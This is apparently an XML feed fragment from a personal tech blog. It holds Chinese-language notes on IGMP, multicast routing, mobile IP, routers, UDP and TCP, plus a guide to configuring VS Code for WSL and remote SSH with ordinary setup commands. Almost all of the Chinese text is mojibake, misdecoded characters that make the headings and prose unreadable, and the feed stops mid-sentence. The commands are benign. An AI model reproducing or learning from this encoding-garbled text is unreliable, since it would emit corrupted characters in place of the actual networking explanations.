href="#IGMPåè®®ä¸ç»„æ’­è·¯ç”±é€‰æ‹©åè®®" class="headerlink" title="IGMPåè®®ä¸ç»„æ’­è·¯ç”±é€‰æ‹©åè®®"></a>IGMPåè®®ä¸ç»„æ’­è·¯ç”±é€‰æ‹©åè®®</h2><h3 id="igmpåè®®"><a href="#IGMPåè®®" class="headerlink" title="IGMPåè®®"></a>IGMPåè®®</h3><p>ä¹Ÿå«ç½‘é™…ç»„ç®¡ç†åè®®</p><p><strong>IGMPåè®®å·¥ä½œçš„ä¸¤ä¸ªé˜¶æ®µ</strong></p><ol><li><p>æŸä¸»æœºè¦åŠ å…¥ç»„æ’­ç»„æ—¶ï¼Œè¯¥ä¸»æœºå‘ç»„æ’­ç»„çš„ç»„æ’­åœ°å€å‘é€ä¸€ä¸ªIGMPæŠ¥æ–‡ï¼Œå£°æ˜è‡ªå·±è¦ç§°ä¸ºè¯¥ç»„çš„æˆå‘˜ã€‚æœ¬åœ°ç»„æ’­è·¯ç”±å™¨æ”¶åˆ°IGMPæŠ¥æ–‡åï¼Œè¦åˆ©ç”¨ç»„æ’­è·¯ç”±é€‰æ‹©åè®®æŠŠè¿™ç»„æˆå‘˜å…³ç³»å‘ç»™å› ç‰¹ç½‘ä¸Šçš„å…¶ä»–ç»„æ’­è·¯ç”±å™¨ã€‚</p></li><li><p>æœ¬åœ°ç»„æ’­è·¯ç”±å™¨å‘¨æœŸæ€§æ¢è¯¢æœ¬åœ°å±€åŸŸç½‘ä¸Šçš„ä¸»æœºï¼Œä»¥ä¾¿çŸ¥é“è¿™äº›ä¸»æœºæ˜¯å¦è¿˜æ˜¯ç»„æ’­ç»„çš„æˆå‘˜ã€‚</p><p>åªè¦æœ‰ä¸€ä¸ªä¸»æœºå¯¹æŸä¸ªç»„å“åº”ï¼Œé‚£ä¹ˆç»„æ’­è·¯ç”±å™¨å°±è®¤ä¸ºè¿™ä¸ªç»„æ˜¯æ´»è·ƒçš„ï¼›å¦‚æœç»è¿‡å‡ æ¬¡æ¢è¯¢åæ²¡æœ‰ä¸€ä¸ªä¸»æœºå“åº”ï¼Œç»„æ’­è·¯ç”±å™¨å°±è®¤ä¸ºæœ¬ç½‘ç»œä¸Šçš„æ²¡æœ‰æ­¤ç»„æ’­ç»„çš„ä¸»æœºï¼Œå› æ­¤å°±ä¸å†æŠŠè¿™ç»„çš„æˆå‘˜å…³ç³»å‘ç»™å…¶ä»–çš„ç»„æ’­è·¯ç”±å™¨ã€‚</p></li></ol><blockquote><p>ç»„æ’­è·¯ç”±å™¨çŸ¥é“çš„æˆå‘˜å…³ç³»åªæ˜¯æ‰€è¿æ¥çš„å±€åŸŸç½‘ä¸­æœ‰æ— ç»„æ’­ç»„çš„æˆå‘˜ã€‚</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151707752.png" alt="image-20240309103754389"></p><h3 id="ç»„æ’­è·¯ç”±é€‰æ‹©åè®®"><a href="#ç»„æ’­è·¯ç”±é€‰æ‹©åè®®" class="headerlink" title="ç»„æ’­è·¯ç”±é€‰æ‹©åè®®"></a>ç»„æ’­è·¯ç”±é€‰æ‹©åè®®</h3><p>ç»„æ’­è·¯ç”±é€‰æ‹©åè®®ç›®çš„æ˜¯æ‰¾å‡ºä»¥æºä¸»æœºä¸ºæ ¹èŠ‚ç‚¹çš„ç»„æ’­è½¬å‘æ ‘ã€‚</p><p>å¯¹ä¸åŒçš„å¤šæ’­ç»„å¯¹åº”äºä¸åŒçš„å¤šæ’­è½¬å‘æ ‘ï¼›åŒä¸€ä¸ªå¤šæ’­ç»„ï¼Œå¯¹ä¸åŒçš„æºç‚¹ä¹Ÿä¼šæœ‰ä¸åŒçš„å¤šæ’­è½¬å‘æ ‘ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151707753.png" alt="image-20240309104118961"></p><p><strong>å¸¸ç”¨çš„ä¸‰ç§ç®—æ³•</strong></p><ol><li><p>åŸºäºé“¾è·¯çŠ¶æ€çš„è·¯ç”±é€‰æ‹©</p></li><li><p>åŸºäºè·ç¦»-å‘é‡çš„è·¯ç”±é€‰æ‹©</p></li><li><p>åè®®æ— å…³çš„ç»„æ’­(ç¨€ç–&#x2F;å¯†é›†)</p><p>ç»„æ’­ç»„ä¸­çš„ä¸»æœºæ¯”è¾ƒåˆ†æ•£å°±ç”¨ç¨€ç–ç®—æ³•ï¼›è¾ƒä¸ºå¯†é›†å°±ç”¨å¯†é›†ç®—æ³•ã€‚</p></li></ol><blockquote><p>ç¬¬ä¸€ç¬¬äºŒç§éƒ½åœ¨å‰é¢æœ‰è¯´è¿‡ã€‚</p></blockquote><h1 id="ç§»åŠ¨ip"><a href="#ç§»åŠ¨IP" class="headerlink" title="ç§»åŠ¨IP"></a>ç§»åŠ¨IP</h1><h2 id="ç›¸å…³æ¦‚å¿µ"><a href="#ç›¸å…³æ¦‚å¿µ" class="headerlink" title="ç›¸å…³æ¦‚å¿µ"></a>ç›¸å…³æ¦‚å¿µ</h2><p>ç§»åŠ¨IPæŠ€æœ¯æ˜¯ç§»åŠ¨ç»“ç‚¹(è®¡ç®—æœº&#x2F;æœåŠ¡å™¨ç­‰)ä»¥å›ºå®šçš„ç½‘ç»œIPåœ°å€ï¼Œå®ç°è·¨è¶Šä¸åŒç½‘æ®µçš„æ¼«æ¸¸åŠŸèƒ½ï¼Œå¹¶ä¿è¯äº†åŸºäºç½‘ç»œIPçš„ç½‘ç»œæƒé™åœ¨æ¼«æ¸¸è¿‡ç¨‹ä¸­ä¸å‘ç”Ÿä»»ä½•æ”¹å˜ã€‚</p><p><strong>ç§»åŠ¨ç»“ç‚¹</strong> å…·æœ‰æ°¸ä¹…IPåœ°å€çš„ç§»åŠ¨è®¾å¤‡ã€‚</p><p><strong>å½’å±ä»£ç†(æœ¬åœ°ä»£ç†)</strong> ä¸€ä¸ªç§»åŠ¨ç»“ç‚¹çš„æ°¸ä¹…â€œå±…æ‰€â€ç§°ä¸ºå½’å±ç½‘ç»œï¼Œåœ¨å½’å±ç½‘ç»œä¸­ä»£è¡¨ç§»åŠ¨èŠ‚ç‚¹æ‰§è¡Œç§»åŠ¨ç®¡ç†åŠŸèƒ½çš„å®ä½“å«åšå½’å±ä»£ç†ã€‚</p><p><strong>æ°¸ä¹…åœ°å€(å½’å±åœ°å€&#x2F;ä¸»åœ°å€)</strong> ç§»åŠ¨ç«™ç‚¹åœ¨å½’å±ç½‘ç»œä¸­çš„åŸå§‹åœ°å€ã€‚</p><p><strong>å¤–éƒ¨ä»£ç†(å¤–åœ°ä»£ç†)</strong> åœ¨å¤–éƒ¨ç½‘ç»œä¸­å¸®åŠ©ç§»åŠ¨èŠ‚ç‚¹å®Œæˆç§»åŠ¨ç®¡ç†åŠŸèƒ½çš„å®ä½“ç§°ä¸ºå¤–éƒ¨ä»£ç†ã€‚</p><p><strong>è½¬äº¤åœ°å€(è¾…åœ°å€)</strong> å¯ä»¥æ˜¯å¤–éƒ¨ä»£ç†çš„åœ°å€æˆ–åŠ¨æ€é…ç½®çš„ä¸€ä¸ªåœ°å€ã€‚</p><h2 id="ç§»åŠ¨ipé€šä¿¡è¿‡ç¨‹"><a href="#ç§»åŠ¨IPé€šä¿¡è¿‡ç¨‹" class="headerlink" title="ç§»åŠ¨IPé€šä¿¡è¿‡ç¨‹"></a>ç§»åŠ¨IPé€šä¿¡è¿‡ç¨‹</h2><p><img src="http://cdn.clown2024.cn/202407151707754.png" alt="image-20240309105307481"></p><h1 id="ç½‘ç»œå±‚è®¾å¤‡"><a href="#ç½‘ç»œå±‚è®¾å¤‡" class="headerlink" title="ç½‘ç»œå±‚è®¾å¤‡"></a>ç½‘ç»œå±‚è®¾å¤‡</h1><h2 id="è·¯ç”±å™¨"><a href="#è·¯ç”±å™¨" class="headerlink" title="è·¯ç”±å™¨"></a>è·¯ç”±å™¨</h2><p>è·¯ç”±å™¨æ˜¯ä¸€ç§å…·æœ‰å¤šä¸ªè¾“å…¥ç«¯å£å’Œè¾“å‡ºç«¯å£çš„ä¸“ç”¨è®¡ç®—æœºï¼Œå…¶ä»»åŠ¡æ˜¯è½¬å‘åˆ†ç»„ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151707755.png" alt="image-20240309105633658"></p><p><strong>è¾“å…¥ç«¯å£çš„å¤„ç†</strong></p><p><img src="http://cdn.clown2024.cn/202407151707756.png" alt="image-20240309105754630"></p><p><strong>è¾“å‡ºç«¯å£</strong></p><p><img src="http://cdn.clown2024.cn/202407151707757.png" alt="image-20240309105909980"></p><h2 id="ä¸‰å±‚è®¾å¤‡çš„åŒºåˆ«"><a href="#ä¸‰å±‚è®¾å¤‡çš„åŒºåˆ«" class="headerlink" title="ä¸‰å±‚è®¾å¤‡çš„åŒºåˆ«"></a>ä¸‰å±‚è®¾å¤‡çš„åŒºåˆ«</h2><p><strong>è·¯ç”±å™¨</strong> å¯ä»¥äº’è”ä¸¤ä¸ªä¸åŒç½‘ç»œå±‚åè®®çš„ç½‘æ®µã€‚</p><p><strong>ç½‘æ¡¥</strong> å¯ä»¥äº’è”ä¸¤ä¸ªç‰©ç†å±‚å’Œé“¾è·¯å±‚ä¸åŒçš„ç½‘æ®µã€‚</p><p><strong>é›†çº¿å™¨</strong> ä¸èƒ½äº’è”ä¸¤ä¸ªç‰©ç†å±‚ä¸åŒçš„ç½‘æ®µ</p><p><img src="http://cdn.clown2024.cn/202407151707758.png" alt="image-20240309110212888"></p><h2 id="è·¯ç”±è¡¨ä¸è·¯ç”±è½¬å‘"><a href="#è·¯ç”±è¡¨ä¸è·¯ç”±è½¬å‘" class="headerlink" title="è·¯ç”±è¡¨ä¸è·¯ç”±è½¬å‘"></a>è·¯ç”±è¡¨ä¸è·¯ç”±è½¬å‘</h2><p>è·¯ç”±è¡¨æ ¹æ®è·¯ç”±é€‰æ‹©ç®—æ³•å¾—å‡ºçš„ï¼Œä¸»è¦ç”¨é€”æ˜¯è·¯ç”±é€‰æ‹©ï¼Œæ€»ç”¨è½¯ä»¶æ¥å®ç°</p><p><img src="http://cdn.clown2024.cn/202407151707759.png" alt="image-20240309110538681"></p>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscodeé…ç½®Linuxå¼€å‘ç¯å¢ƒ</title>
      <link href="/2024/03/06/vscode%E9%85%8D%E7%BD%AELinux%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/03/06/vscode%E9%85%8D%E7%BD%AELinux%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="vscodeé…ç½®wslå¼€å‘ç¯å¢ƒ"><a href="#VSCodeé…ç½®wslå¼€å‘ç¯å¢ƒ" class="headerlink" title="VSCodeé…ç½®wslå¼€å‘ç¯å¢ƒ"></a>VSCodeé…ç½®wslå¼€å‘ç¯å¢ƒ</h1><p>åœ¨vscodeä¸Šä½¿ç”¨wslè¿›è¡Œå¼€å‘ç¯å¢ƒå°±æ¯”è¾ƒç®€å•ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯Ubuntuçš„wsl</p><p>é¦–å…ˆæ£€æŸ¥ä¸€ä¸‹wslé‡Œé¢æœ‰æ²¡æœ‰gccå’Œg++ç¼–è¯‘å™¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">g++ -v<br>gcc -v<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444002.png" alt="image-20240306164855577"></p><p><img src="http://cdn.clown2024.cn/202407151444003.png" alt="image-20240306164915530"></p><p>å¦‚æœæ²¡æœ‰å°±æ‰§è¡Œä¸‹é¢å‘½ä»¤å®‰è£…</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt-get update #æ›´æ–°è½¯ä»¶åŒ…åˆ—è¡¨<br>sudo apt-get install build-essential gdb #å®‰è£… GNU ç¼–è¯‘å™¨å·¥å…·å’Œ GDB è°ƒè¯•å™¨<br></code></pre></td></tr></table></figure><p>ç„¶åå»åˆ›å»ºä¸€ä¸ªé¡¹ç›®æ–‡ä»¶å¤¹ï¼Œåœ¨éœ€è¦vscodeæ‰“å¼€çš„æ–‡ä»¶å¤¹ä¸‹è¾“å…¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">code .<br></code></pre></td></tr></table></figure><p>å°±ä¼šè‡ªåŠ¨å¼€å¯ä¸€ä¸ªvscode</p><p><img src="http://cdn.clown2024.cn/202407151444004.png" alt="image-20240306165346221"></p><p>å·¦ä¸‹è§’å°±ä¼šæ˜¾ç¤ºwslçš„è¿æ¥</p><p><img src="http://cdn.clown2024.cn/202407151444005.png" alt="image-20240306165411416"></p><p>éšä¾¿å†™ä¸ªcppæ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬åœ¨ç»ˆç«¯å°±å¯ä»¥è¿›è¡Œç¼–è¯‘äº†</p><p><img src="http://cdn.clown2024.cn/202407151444006.png" alt="image-20240306165629607"></p><p><strong>ä»vscodeä¸­å¯åŠ¨wsl</strong></p><p>åªéœ€è¦å®‰è£…ä¸¤ä¸ªremoteæ‰©å±•å°±å¯ä»¥äº†</p><p><img src="http://cdn.clown2024.cn/202407151444007.png" alt="image-20240306170459303"></p><p><img src="http://cdn.clown2024.cn/202407151444008.png" alt="image-20240306170511786"></p><p>ç„¶åå‘½ä»¤è¾“å…¥wslå³å¯è¿æ¥</p><p><img src="http://cdn.clown2024.cn/202407151444009.png" alt="image-20240306170442810"></p><p>å¦‚æœæœ‰å¤šä¸ªå‘è¡Œç‰ˆæƒ³è¦æŒ‡å®šçš„è¯å°±é€‰è¿™ä¸ª</p><p><img src="http://cdn.clown2024.cn/202407151444010.png" alt="image-20240306170834830"></p><blockquote><p>å¦å¤–ä¸æƒ³å‘½ä»¤è¡Œç¼–è¯‘è°ƒè¯•çš„è¯ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ä¸ºwslå®‰è£…code runnerå’Œc++æ‰©å±•å³å¯</p></blockquote><h1 id="vscodeé…ç½®è¿œç¨‹æœåŠ¡å™¨è¿æ¥"><a href="#VSCodeé…ç½®è¿œç¨‹æœåŠ¡å™¨è¿æ¥" class="headerlink" title="VSCodeé…ç½®è¿œç¨‹æœåŠ¡å™¨è¿æ¥"></a>VSCodeé…ç½®è¿œç¨‹æœåŠ¡å™¨è¿æ¥</h1><p>é¦–å…ˆå®‰è£…å¥½è¿™ä¸ªæ’ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151444011.png" alt="image-20240306205105832"></p><p>ç„¶åå»configæ–‡ä»¶é…ç½®sshæ–‡ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151444012.png" alt="image-20240306205237737"></p><p>è¦å…ˆåœ¨æœ¬æœºä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç”Ÿæˆå¯†é’¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa  //ä¸€èˆ¬é»˜è®¤ä¿å­˜åœ¨~/.sshè·¯å¾„ä¸‹<br></code></pre></td></tr></table></figure><p>ç„¶åé…ç½®æ–‡ä»¶å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Host &lt;éšä¾¿å¡«ä¸»æœºå&gt;<br>HostName &lt;è¿œç¨‹ä¸»æœºipåœ°å€&gt;<br>User &lt;ç™»é™†ç”¨æˆ·&gt;<br>IdentityFile &lt;ç§é’¥è·¯å¾„&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444013.png" alt="image-20240306205426338"></p><p>é…ç½®å¥½æœ¬æœºsshæ–‡ä»¶ä¹‹åï¼Œå…¬é’¥æ”¾åœ¨è¿œç¨‹ä¸»æœºçš„~&#x2F;.sshä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151444014.png" alt="image-20240306205744858"></p><p>ç„¶åæŠŠå…¬é’¥æ–‡ä»¶å†™å…¥authorized_keysé‡Œå³å¯å®Œæˆæ•´ä¸ªé…ç½®</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat id_rsa_vps.pub &gt;&gt; authorized_keys<br></code></pre></td></tr></table></figure><blockquote><p>å…¬é’¥ç§é’¥æ˜¯ç”¨æ¥è¿›è¡Œå…å¯†ç™»é™†çš„ï¼Œä¹Ÿå¯ä»¥ä¸ä½¿ç”¨ï¼Œåªä¸è¿‡åœ¨ç™»é™†çš„æ—¶å€™å°±è¦è¾“å…¥å¯†ç </p></blockquote><p>ç„¶åç‚¹å‡»åœ¨æ–°çª—å£è¿æ¥ä¸»æœº</p><p><img src="http://cdn.clown2024.cn/202407151444015.png" alt="image-20240306210558090"></p><p>æˆåŠŸï¼å…¶ä½™çš„å¼€å‘é…ç½®å°±å’Œä¸Šé¢çš„wslé…ç½®æ²¡ä»€ä¹ˆåŒºåˆ«äº†ï¼Œå°±æ‡’å¾—æ•´äº†</p>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c/c++ ç¯å¢ƒé…ç½® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç½‘ç»œå­¦ä¹ -3</title>
      <link href="/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-3/"/>
      <url>/2024/03/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-3/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¼ è¾“å±‚æ¦‚è¿°"><a href="#ä¼ è¾“å±‚æ¦‚è¿°" class="headerlink" title="ä¼ è¾“å±‚æ¦‚è¿°"></a>ä¼ è¾“å±‚æ¦‚è¿°</h1><p>ä¼ è¾“å±‚å­¦ä¹ ä¸¤ç§åè®®ï¼ŒTCPå’ŒUDPåè®®</p><p><img src="http://cdn.clown2024.cn/202407151537875.png" alt="image-20240305182817812"></p><p><strong>TCPåè®®çš„ä½œç”¨ï¼š</strong></p><ul><li>å¯é ä¼ è¾“</li><li>æµé‡æ§åˆ¶</li><li>æ‹¥å¡æ§åˆ¶</li></ul><p>ä¼ è¾“å±‚æ˜¯åªæœ‰ä¸»æœºæ‰æœ‰çš„å±‚æ¬¡ï¼Œä¼ è¾“å±‚å¯ä»¥ä¸ºåº”ç”¨å±‚æä¾›æœåŠ¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç½‘ç»œå±‚çš„æœåŠ¡</p><p>ä¼ è¾“å±‚çš„åŠŸèƒ½ï¼š</p><ul><li>ä¼ è¾“å±‚æä¾›è¿›ç¨‹å’Œè¿›ç¨‹ä¹‹é—´çš„é€»è¾‘é€šä¿¡ã€‚ç½‘ç»œå±‚åˆ™æä¾›ä¸»æœºä¹‹é—´çš„é€»è¾‘é€šä¿¡ã€‚</li><li>å¤ç”¨å’Œåˆ†ç”¨ã€‚</li><li>ä¼ è¾“å±‚å¯¹æ”¶åˆ°çš„æŠ¥æ–‡è¿›è¡Œå·®é”™æ£€æµ‹</li><li>ä¼ è¾“å±‚æœ‰ä¸¤ç§åè®®</li></ul><h1 id="ä¼ è¾“å±‚çš„å¯»å€ä¸ç«¯å£"><a href="#ä¼ è¾“å±‚çš„å¯»å€ä¸ç«¯å£" class="headerlink" title="ä¼ è¾“å±‚çš„å¯»å€ä¸ç«¯å£"></a>ä¼ è¾“å±‚çš„å¯»å€ä¸ç«¯å£</h1><p><strong>å¤ç”¨</strong>ï¼šåº”ç”¨å±‚æ‰€æœ‰çš„åº”ç”¨è¿›ç¨‹éƒ½å¯ä»¥é€šè¿‡ä¼ è¾“å±‚å†ä¼ è¾“åˆ°ç½‘ç»œå±‚ã€‚</p><p><strong>åˆ†ç”¨</strong>ï¼šä¼ è¾“å±‚ä»ç½‘ç»œå±‚æ”¶åˆ°æ•°æ®åäº¤ä»˜æŒ‡æ˜çš„åº”ç”¨è¿›ç¨‹ã€‚</p><p>ç«¯å£å·æ ‡è¯†ä¸»æœºä¸­çš„åº”ç”¨è¿›ç¨‹ã€‚</p><p>ç«¯å£å·é•¿åº¦ä¸º16bitï¼Œæ‰€ä»¥èƒ½è¡¨ç¤ºçš„ç«¯å£å·æ•°é‡ä¸º65535ä¸ªã€‚</p><p><strong>ç«¯å£å·çš„åˆ†ç±»ï¼š</strong></p><p><img src="http://cdn.clown2024.cn/202407151537876.png" alt="image-20240305183319948"></p><p>æ‰€ä»¥æœ‰äº›ç¨‹åºéƒ½ä¼šæœ‰é»˜è®¤ç«¯å£å·ï¼Œæ¯”å¦‚HTTPçš„80ç«¯å£ï¼ŒHTTPSçš„443ç«¯å£ï¼Œè¿™é‡Œåˆ—ä¸¾å‡ºä¸€äº›åè®®çš„ç«¯å£å·ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151537877.png" alt="image-20240305183457929"></p><blockquote><p> åœ¨ç½‘ç»œä¸­é‡‡ç”¨å‘é€æ–¹å’Œæ¥æ”¶æ–¹çš„å¥—æ¥å­—ç»„åˆæ¥è¯†åˆ«ç«¯ç‚¹ï¼Œå¥—æ¥å­—å”¯ä¸€æ ‡è¯†äº†ç½‘ç»œä¸­çš„ä¸€ä¸ªä¸»æœºå’Œå®ƒä¸Šé¢çš„ä¸€ä¸ªè¿›ç¨‹ã€‚</p><p>å¥—æ¥å­—socket&#x3D;(ä¸»æœºIPåœ°å€ï¼Œç«¯å£å·)</p></blockquote><h1 id="udpåè®®"><a href="#UDPåè®®" class="headerlink" title="UDPåè®®"></a>UDPåè®®</h1><p>UDPåªåœ¨IPæ•°æ®æŠ¥æœåŠ¡ä¹‹ä¸Šå¢åŠ äº†å¾ˆå°‘åŠŸèƒ½ï¼Œå³å¤ç”¨åˆ†ç”¨å’Œå·®é”™æ£€æµ‹åŠŸèƒ½ã€‚</p><h2 id="udpçš„ä¸»è¦ç‰¹ç‚¹"><a href="#UDPçš„ä¸»è¦ç‰¹ç‚¹" class="headerlink" title="UDPçš„ä¸»è¦ç‰¹ç‚¹"></a>UDPçš„ä¸»è¦ç‰¹ç‚¹</h2><ol><li><p>UDPæ˜¯æ— è¿æ¥çš„ï¼Œå‡å°‘å¼€é”€å’Œå‘é€æ•°æ®ä¹‹å‰çš„æ—¶å»¶ã€‚</p></li><li><p>UDPä½¿ç”¨æœ€å¤§åŠªåŠ›äº¤ä»˜ï¼Œå³ä¸ä¿è¯å¯é äº¤ä»˜ã€‚</p></li><li><p>UDPæ˜¯é¢å‘æŠ¥æ–‡çš„ï¼Œé€‚åˆä¸€æ¬¡æ€§ä¼ è¾“å°‘é‡æ•°æ®çš„ç½‘ç»œåº”ç”¨ã€‚</p></li><li><p>UDPæ— æ‹¥å¡æ§åˆ¶ï¼Œé€‚åˆå¾ˆå¤šå®æ—¶åº”ç”¨ï¼Œæ¯”å¦‚ä¸€äº›å®æ—¶è§†é¢‘ä¹‹ç±»çš„ï¼Œä¸¢å¤±äº†å°‘é‡æ•°æ®ä¹Ÿæ˜¯å…è®¸çš„ã€‚</p></li><li><p>UDPé¦–éƒ¨å¼€é”€å°ï¼Œ8B(å­—èŠ‚)ï¼ŒTCP20B(å­—èŠ‚)</p></li></ol><p><img src="http://cdn.clown2024.cn/202407151537878.png" alt="image-20240305215954723"></p><h2 id="udpé¦–éƒ¨æ ¼å¼"><a href="#UDPé¦–éƒ¨æ ¼å¼" class="headerlink" title="UDPé¦–éƒ¨æ ¼å¼"></a>UDPé¦–éƒ¨æ ¼å¼</h2><p><img src="http://cdn.clown2024.cn/202407151537879.png" alt="image-20240305220132283"></p><h2 id="udpæ ¡éªŒè¿‡ç¨‹"><a href="#UDPæ ¡éªŒè¿‡ç¨‹" class="headerlink" title="UDPæ ¡éªŒè¿‡ç¨‹"></a>UDPæ ¡éªŒè¿‡ç¨‹</h2><p><img src="http://cdn.clown2024.cn/202407151537880.png" alt="image-20240305220303149"></p><p><strong>ä¼ªé¦–éƒ¨æ ¡éªŒ</strong></p><p><img src="http://cdn.clown2024.cn/202407151537881.png" alt="image-20240305220730662"></p><h1 id="tcpåè®®"><a href="#TCPåè®®" class="headerlink" title="TCPåè®®"></a>TCPåè®®</h1><h2 id="tcpåè®®çš„ç‰¹ç‚¹"><a href="#TCPåè®®çš„ç‰¹ç‚¹" class="headerlink" title="TCPåè®®çš„ç‰¹ç‚¹"></a>TCPåè®®çš„ç‰¹ç‚¹</h2><p><img src="http://cdn.clown2024.cn/202407151537882.png" alt="image-20240305221800753"></p><p>å‘é€æ•°æ®æ—¶ï¼Œå…ˆæŠŠä¸€å®šçš„å­—èŠ‚æ”¾å…¥ç¼“å­˜ä¸­ï¼Œç„¶åå–ä¸€äº›å­—èŠ‚ç»„æˆæŠ¥æ–‡æ®µç„¶åå¸¦ä¸ŠTCPå¤´éƒ¨ç»„æˆå®Œæ•´æŠ¥æ–‡æ®µ</p><p><img src="http://cdn.clown2024.cn/202407151537883.png" alt="image-20240305222029888"></p><blockquote><p>å­—èŠ‚æ•°ä¸æ˜¯å›ºå®šçš„</p></blockquote><h2 id="tcpæŠ¥æ–‡æ®µé¦–éƒ¨æ ¼å¼"><a href="#TCPæŠ¥æ–‡æ®µé¦–éƒ¨æ ¼å¼" class="headerlink" title="TCPæŠ¥æ–‡æ®µé¦–éƒ¨æ ¼å¼"></a>TCPæŠ¥æ–‡æ®µé¦–éƒ¨æ ¼å¼</h2><p><img src="http://cdn.clown2024.cn/202407151537884.png" alt="image-20240305222924879"></p><p><strong>ä¸‹é¢æ˜¯å„ä¸ªéƒ¨åˆ†çš„ä½œç”¨ï¼š</strong></p><ul><li><p>åºå·:åœ¨ä¸€ä¸ªTCPè¿æ¥ä¸­ä¼ é€çš„å­—èŠ‚æµä¸­çš„æ¯ä¸€ä¸ªå­—èŠ‚éƒ½æŒ‰é¡ºåºç¼–å·ï¼Œæœ¬å­—æ®µè¡¨ç¤ºæœ¬æŠ¥æ–‡æ®µæ‰€å‘é€æ•°æ®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åºå·ã€‚</p></li><li><p>ç¡®è®¤å·:æœŸæœ›æ”¶åˆ°å¯¹æ–¹ä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µçš„ç¬¬ä¸€ä¸ªæ•°æ®å­—èŠ‚çš„åºå·ã€‚è‹¥ç¡®è®¤å·ä¸ºN,åˆ™è¯æ˜åˆ°åºå·N-1ä¸ºæ­¢çš„æ‰€æœ‰æ•°æ®éƒ½å·²æ­£ç¡®æ”¶åˆ°ã€‚</p></li><li><p>æ•°æ®åç§»(é¦–éƒ¨é•¿åº¦):TCPæŠ¥æ–‡æ®µçš„æ•°æ®èµ·å§‹å¤„è·ç¦»TCPæŠ¥æ–‡æ®µçš„èµ·å§‹å¤„æœ‰å¤šè¿œä»¥4Bä½å•ä½ï¼Œå³1ä¸ªæ•°å€¼æ˜¯4Bã€‚</p></li><li><p>çª—å£:æŒ‡çš„æ˜¯å‘é€æœ¬æŠ¥æ–‡æ®µçš„ä¸€æ–¹çš„æ¥æ”¶çª—å£ï¼Œå³ç°åœ¨å…è®¸å¯¹æ–¹å‘é€çš„æ•°æ®é‡ã€‚</p></li><li><p>æ£€éªŒå’Œ:æ£€éªŒé¦–éƒ¨+æ•°æ®ï¼Œæ£€éªŒæ—¶è¦åŠ ä¸Š12Bä¼ªé¦–éƒ¨ï¼Œç¬¬å››ä¸ªå­—æ®µä¸º6ã€‚</p></li><li><p>ç´§æ€¥æŒ‡é’ˆ:URG&#x3D;1æ—¶æ‰æœ‰æ„ä¹‰ï¼ŒæŒ‡å‡ºæœ¬æŠ¥æ–‡æ®µä¸­ç´§æ€¥æ•°æ®çš„å­—èŠ‚æ•°</p></li><li><p>é€‰é¡¹:æœ€å¤§æŠ¥æ–‡æ®µé•¿åº¦MSSã€çª—å£æ‰©å¤§ã€æ—¶é—´æˆ³ã€é€‰æ‹©ç¡®è®¤â€¦</p></li><li><p>å¡«å……:å³å°†æŠ¥æ–‡é¦–éƒ¨å¡«å……è‡³4Bçš„æ•´æ•°å€</p></li></ul><p><strong>6ä¸ªæ§åˆ¶ä½</strong></p><ul><li><p>ç´§æ€¥ä½URGï¼šURG&#x3D;1æ—¶ï¼Œæ ‡æ˜æ­¤æŠ¥æ–‡æ®µä¸­æœ‰ç´§æ€¥æ•°æ®ï¼Œæ˜¯é«˜ä¼˜å…ˆçº§çš„æ•°æ®ï¼Œåº”å°½å¿«ä¼ é€ï¼Œä¸ç”¨åœ¨ç¼“å­˜é‡Œæ’é˜Ÿï¼Œé…åˆç´§æ€¥æŒ‡é’ˆå­—æ®µä½¿ç”¨ã€‚</p></li><li><p>ç¡®è®¤ä½ACKï¼šACK&#x3D;1æ—¶ç¡®è®¤å·æœ‰æ•ˆï¼Œåœ¨è¿æ¥å»ºç«‹åæ‰€æœ‰ä¼ 